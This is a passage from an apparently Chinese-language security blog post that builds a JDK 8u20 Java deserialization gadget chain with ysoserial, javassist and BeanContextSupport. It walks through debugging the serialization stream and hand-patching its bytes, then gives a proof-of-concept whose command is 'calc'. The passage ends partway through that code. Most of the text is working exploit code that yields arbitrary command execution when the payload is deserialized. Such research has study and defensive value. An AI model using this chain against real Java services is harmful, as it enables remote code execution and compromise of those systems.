</span></span><span style="display:flex;"><span>        LinkedHashSet set <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> LinkedHashSet<span style="color:#ff79c6">();</span> <span style="color:#6272a4">// maintain order
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        set<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>support<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        set<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        set<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>proxy<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_auxClasses&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_class&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        map<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>zeroHashCodeStr<span style="color:#ff79c6">,</span> templates<span style="color:#ff79c6">);</span> <span style="color:#6272a4">// swap in real object
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> set<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> ser <span style="color:#ff79c6">=</span> Serializer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">serialize</span><span style="color:#ff79c6">(</span>getObject<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;calc&#34;</span><span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>        Deserializer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">deserialize</span><span style="color:#ff79c6">(</span>ser<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>然后报错。仔细debug会发现在BeanContextSupport#deserialize的时候没能从ois里正确地读出一个整数</p>
<p><img src="https://s2.loli.net/2022/11/04/PrMuHZVcDQWoJed.png" alt="image-20221104153026163"></p>
<p>事实上这一段是在读取BeanContextSupport的objectAnnotation部分。继续动调会发现其在读取BlockHeader的时候发生了错误，导致函数返回-1</p>
<p><img src="https://s2.loli.net/2022/11/04/26CLSO9ekBabE71.png" alt="image-20221104153455974"></p>
<p>这就涉及到重要概念<code>TC_ENDBLOCKDATA</code></p>
<blockquote>
<p>The flag <em>SC_WRITE_METHOD</em> is set if the Serializable class writing the stream had a <code>writeObject</code> method that may have written additional data to the stream. In this case a <em>TC_ENDBLOCKDATA</em> marker is always expected to terminate the data for that class.</p>
</blockquote>
<p>继续debug，看看defaultDataEnd是什么时候被设置为true的。</p>
<p><img src="https://s2.loli.net/2022/11/04/vzd7nuiBHmtG2Ns.png" alt="image-20221104153643656"></p>
<p>如图，因为sun.reflect.annotation.AnnotationInvocationHandler没有WriteObject方法，导致这个字段被设置成了true。于是乎，利用javassist创造一个类，给它加上这个方法。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> ysoserial.test.payloads<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.ClassPool<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.CtClass<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.CtMethod<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.payloads.util.Gadgets<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.payloads.util.Reflections<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.beans.beancontext.BeanContextSupport<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.InvocationHandler<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.HashMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.LinkedHashSet<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.xml.transform.Templates<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.Serializer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.Deserializer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Temp</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> Class <span style="color:#50fa7b">handlerWithWriteObject</span><span style="color:#ff79c6">()</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        ClassPool pool <span style="color:#ff79c6">=</span> ClassPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDefault</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        CtClass clazz <span style="color:#ff79c6">=</span> pool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>Gadgets<span style="color:#ff79c6">.</span><span style="color:#50fa7b">ANN_INV_HANDLER_CLASS</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        CtMethod writeObjectMethod <span style="color:#ff79c6">=</span> CtMethod<span style="color:#ff79c6">.</span><span style="color:#50fa7b">make</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#ff79c6">+</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;    private void writeObject(java.io.ObjectOutputStream s)\n&#34;</span> <span style="color:#ff79c6">+</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;        throws java.io.IOException {\n&#34;</span> <span style="color:#ff79c6">+</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;        s.defaultWriteObject();\n&#34;</span> <span style="color:#ff79c6">+</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;    }&#34;</span><span style="color:#ff79c6">,</span> clazz<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        clazz<span style="color:#ff79c6">.</span><span style="color:#50fa7b">addMethod</span><span style="color:#ff79c6">(</span>writeObjectMethod<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> clazz<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toClass</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> Object <span style="color:#50fa7b">getObject</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">final</span> String command<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">final</span> Object templates <span style="color:#ff79c6">=</span> Gadgets<span style="color:#ff79c6">.</span><span style="color:#50fa7b">createTemplatesImpl</span><span style="color:#ff79c6">(</span>command<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        String zeroHashCodeStr <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;f5a5a608&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        HashMap map <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        map<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>zeroHashCodeStr<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;foo&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        InvocationHandler tempHandler <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>InvocationHandler<span style="color:#ff79c6">)</span> Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getFirstCtor</span><span style="color:#ff79c6">(</span>
</span></span><span style="display:flex;"><span>            handlerWithWriteObject<span style="color:#ff79c6">()</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">).</span><span style="color:#50fa7b">newInstance</span><span style="color:#ff79c6">(</span>Override<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">,</span> map<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>tempHandler<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;type&#34;</span><span style="color:#ff79c6">,</span> Templates<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Templates proxy <span style="color:#ff79c6">=</span> Gadgets<span style="color:#ff79c6">.</span><span style="color:#50fa7b">createProxy</span><span style="color:#ff79c6">(</span>tempHandler<span style="color:#ff79c6">,</span> Templates<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        BeanContextSupport support <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> BeanContextSupport<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        HashMap childrenMap <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        childrenMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>tempHandler<span style="color:#ff79c6">,</span> 0<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>support<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;children&#34;</span><span style="color:#ff79c6">,</span> childrenMap<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>support<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;serializable&#34;</span><span style="color:#ff79c6">,</span> 1<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        LinkedHashSet set <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> LinkedHashSet<span style="color:#ff79c6">();</span> <span style="color:#6272a4">// maintain order
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        set<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>support<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        set<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        set<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>proxy<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_auxClasses&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_class&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        map<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>zeroHashCodeStr<span style="color:#ff79c6">,</span> templates<span style="color:#ff79c6">);</span> <span style="color:#6272a4">// swap in real object
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> set<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> ser <span style="color:#ff79c6">=</span> Serializer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">serialize</span><span style="color:#ff79c6">(</span>getObject<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;calc&#34;</span><span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>        Deserializer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">deserialize</span><span style="color:#ff79c6">(</span>ser<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>依然报错。debug发现依然是在这个readBlockHeader发生了错误。具体而言是读取的这个blockheader发生了错误</p>
<p><img src="https://s2.loli.net/2022/11/04/YWgp2a1FfuUwQNC.png" alt="image-20221104154306563"></p>
<p>header要求必须是TC_BLOCKDATA、TC_BLOCKDATALONG、TC_RESET，否则就会报错。而这里的tc=120，没有任何一个匹配的上。</p>
<p>这里就要手搓二进制了。生成一个字节码文件，debug结合工具定位到这个字节附近。</p>
<p><img src="https://s2.loli.net/2022/11/04/IWMw4aFHSo3DPr5.png" alt="image-20221104154604301"></p>
<p>发现后面跟了一个Interger对象，而找不到blockerHeader。事实上接下来应该读取BeanContextSupport写在objectAnnotation的部分。再结合TC_BLOCKDATA的定义</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#6272a4">/**
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     * Block of optional data. Byte following tag indicates number
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     * of bytes in this block data.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">final</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">byte</span> TC_BLOCKDATA <span style="color:#ff79c6">=</span>    <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span>0x77<span style="color:#ff79c6">;</span>
</span></span></code></pre></div><p>胆大心细，直接把这一段删掉！</p>
<p><img src="https://s2.loli.net/2022/11/04/9uLHNR23POsMgp7.png" alt="image-20221104155208749"></p>
<p>然后读取文件反序列化，Pwn!</p>
<p><img src="https://s2.loli.net/2022/11/04/xUgu6JRkwePj4yK.png" alt="image-20221104155612330"></p>
<h2 id="poc">POC</h2>
<p>注意由于新建了一个AnnotationInvocationHandler类，不能在同一次运行的时候同时序列化和反序列化。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> ysoserial.test.payloads<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.ClassPool<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.CtClass<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.CtMethod<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.io.FileUtils<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.payloads.util.Gadgets<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.payloads.util.Reflections<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.payloads.util.ByteUtils<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.beans.beancontext.BeanContextSupport<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.File<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.InvocationHandler<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.HashMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.LinkedHashSet<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.xml.transform.Templates<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.Serializer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.Deserializer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Jdk8u20Test</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> Class <span style="color:#50fa7b">handlerWithWriteObject</span><span style="color:#ff79c6">()</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        ClassPool pool <span style="color:#ff79c6">=</span> ClassPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDefault</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        CtClass clazz <span style="color:#ff79c6">=</span> pool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>Gadgets<span style="color:#ff79c6">.</span><span style="color:#50fa7b">ANN_INV_HANDLER_CLASS</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        CtMethod writeObjectMethod <span style="color:#ff79c6">=</span> CtMethod<span style="color:#ff79c6">.</span><span style="color:#50fa7b">make</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#ff79c6">+</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;    private void writeObject(java.io.ObjectOutputStream s)\n&#34;</span> <span style="color:#ff79c6">+</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;        throws java.io.IOException {\n&#34;</span> <span style="color:#ff79c6">+</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;        s.defaultWriteObject();\n&#34;</span> <span style="color:#ff79c6">+</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;    }&#34;</span><span style="color:#ff79c6">,</span> clazz<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        clazz<span style="color:#ff79c6">.</span><span style="color:#50fa7b">addMethod</span><span style="color:#ff79c6">(</span>writeObjectMethod<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> clazz<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toClass</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> Object <span style="color:#50fa7b">getObject</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">final</span> String command<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">final</span> Object templates <span style="color:#ff79c6">=</span> Gadgets<span style="color:#ff79c6">.</span><span style="color:#50fa7b">createTemplatesImpl</span><span style="color:#ff79c6">(</span>command<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        String zeroHashCodeStr <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;f5a5a608&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        HashMap map <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        map<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>zeroHashCodeStr<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;foo&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        InvocationHandler tempHandler <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>InvocationHandler<span style="color:#ff79c6">)</span> Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getFirstCtor</span><span style="color:#ff79c6">(</span>
</span></span><span style="display:flex;"><span>            handlerWithWriteObject<span style="color:#ff79c6">()</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">).</span><span style="color:#50fa7b">newInstance</span><span style="color:#ff79c6">(</span>Override<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">,</span> map<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>tempHandler<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;type&#34;</span><span style="color:#ff79c6">,</span> Templates<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Templates proxy <span style="color:#ff79c6">=</span> Gadgets<span style="color:#ff79c6">.</span><span style="color:#50fa7b">createProxy</span><span style="color:#ff79c6">(</span>tempHandler<span style="color:#ff79c6">,</span> Templates<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        BeanContextSupport support <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> BeanContextSupport<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        HashMap childrenMap <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        childrenMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>tempHandler<span style="color:#ff79c6">,</span> 0<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>support<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;children&#34;</span><span style="color:#ff79c6">,</span> childrenMap<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>support<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;serializable&#34;</span><span style="color:#ff79c6">,</span> 1<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        LinkedHashSet set <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> LinkedHashSet<span style="color:#ff79c6">();</span> <span style="color:#6272a4">// maintain order
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        set<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>support<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        set<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        set<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>proxy<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_auxClasses&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_class&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        map<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>zeroHashCodeStr<span style="color:#ff79c6">,</span> templates<span style="color:#ff79c6">);</span> <span style="color:#6272a4">// swap in real object
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> set<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">writeExp</span><span style="color:#ff79c6">()</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> ser <span style="color:#ff79c6">=</span> Serializer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">serialize</span><span style="color:#ff79c6">(</span>getObject<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;calc&#34;</span><span style="color:#ff79c6">));</span>
